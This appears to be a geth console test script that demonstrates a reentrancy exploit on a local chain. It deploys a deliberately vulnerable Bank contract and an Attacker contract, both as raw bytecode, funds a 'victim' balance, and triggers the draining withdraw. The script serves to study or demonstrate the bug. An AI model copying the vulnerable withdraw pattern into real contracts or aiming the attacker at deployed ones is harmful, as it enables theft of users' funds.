var me = eth.accounts[0];

console.log("Test ::: Me: " + me + " and my balance: " + eth.getBalance(me));



miner.start(1);

console.log("Test ::: Creating Bank contract:");

var bankContract = web3.eth.contract([{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"payable":false,"type":"function","stateMutability":"nonpayable"},{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"addBalance","outputs":[],"payable":true,"type":"function","stateMutability":"payable"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balance","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function","stateMutability":"view"},{"constant":false,"inputs":[{"name":"to","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function","stateMutability":"nonpayable"}]);

var bankAddr;

var bank = bankContract.new(

   {

     from: me, 

     data: '0x606060405261023e806100126000396000f360606040526000357c0100000000000000000000000000000000000000000000000000000000900480632e1a7d4d1461005d578063b5cef24a1461007a578063e3d670d714610092578063f8b2cb4f146100c357610058565b610002565b346100025761007860048080359060200190919050506100f4565b005b61009060048080359060200190919050506101a5565b005b34610002576100ad60048080359060200190919050506101e5565b6040518082815260200191505060405180910390f35b34610002576100de6004808035906020019091905050610200565b6040518082815260200191505060405180910390f35b600081600060005060003373ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600050541015156101a0573373ffffffffffffffffffffffffffffffffffffffff168260405180905060006040518083038185876185025a03f192505050905081600060005060003373ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828282505403925050819055505b5b5050565b34600060005060008373ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828282505401925050819055505b50565b60006000506020528060005260406000206000915090505481565b6000600060005060008373ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600050549050610239565b91905056',

     gas: '4700000'

   }, function (e, contract){

    if (typeof contract.address !== 'undefined') {

	bankAddr = contract.address;



	console.log("Test ::: Created Bank contract: " + bankAddr);

	console.log("Test ::: Creating Attacker contract:");
var attackContract = web3.eth.contract([{"constant":false,"inputs":[],"name":"withdraw","outputs":[],"payable":false,"type":"function","stateMutability":"nonpayable"},{"constant":true,"inputs":[],"name":"bank","outputs":[{"name":"","type":"address"}],"payable":false,"type":"function","stateMutability":"view"},{"constant":false,"inputs":[],"name":"addBalance","outputs":[],"payable":false,"type":"function","stateMutability":"nonpayable"},{"inputs":[{"name":"addr","type":"address"}],"type":"constructor","payable":true,"stateMutability":"payable"},{"payable":true,"type":"fallback","stateMutability":"payable"}]);
var attackAddr;

var attack = attackContract.new(

       bankAddr,

	   {

	     from: me, 
data:'0x60606040526001600160146101000a81548160ff021916908302179055506040516020806104c9833981016040528080519060200190919050505b33600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff0219169083021790555080600060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908302179055505b50610429806100a06000396000f360606040523615610053576000357c0100000000000000000000000000000000000000000000000000000000900480633ccfd60b146101a657806376cdb03b146101ba578063b163cc38146101f857610053565b6101a45b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f30600060405160200152604051827c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b156100025760325a03f1156100025750505060405180519060200150604051827c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b156100025760325a03f115610002575050505b565b005b34610002576101b8600480505061020c565b005b34610002576101cc6004805050610359565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b346100025761020a600480505061037f565b005b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f30600060405160200152604051827c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b156100025760325a03f1156100025750505060405180519060200150604051827c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b156100025760325a03f115610002575050505b565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663b5cef24a30604051827c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b156100025760325a03f115610002575050505b56',
gas: '4700000'

	   }, function (e, contract){

	    if (typeof contract.address !== 'undefined') {

        attackAddr=attack.address;



		attack = attackContract.at(attackAddr);

		console.log("Test ::: Created Attack contract: " + attackAddr);



		var donator=eth.accounts[1];

		console.log("Test ::: Attack is me: " + me);

		console.log("Test ::: Real Attack contract: " + attackAddr);

		console.log("Test ::: Bank contract: " + bankAddr);

		console.log("Test ::: The victim of the bug - a donator: " + donator);

		// bank.donate(attackAddr, {from: me, value: 1000}); 

		// bank.addBalance(attackAddr, {from: me, value:1000}); 

		attack.addBalance.call({from:me, value:1000});

		admin.sleepBlocks(3);



		// // bank.donate(donator, {from: me, value: 3000}); 

		bank.addBalance(donator, {from: me, value: 3000}); 

        admin.sleepBlocks(3);



		// console.log("Test ::: Before: Bank has " + eth.getBalance(bankAddr) + " and Attack has " + eth.getBalance(attackAddr));

        // console.log(bank.getBalance.call(attackAddr))



		// eth.sendTransaction({from: me, to: attackAddr, value: 1, gas: 500000}); 
attack.withdraw.call({from:me});
admin.sleepBlocks(3);

	    }

	 });

    }

 });
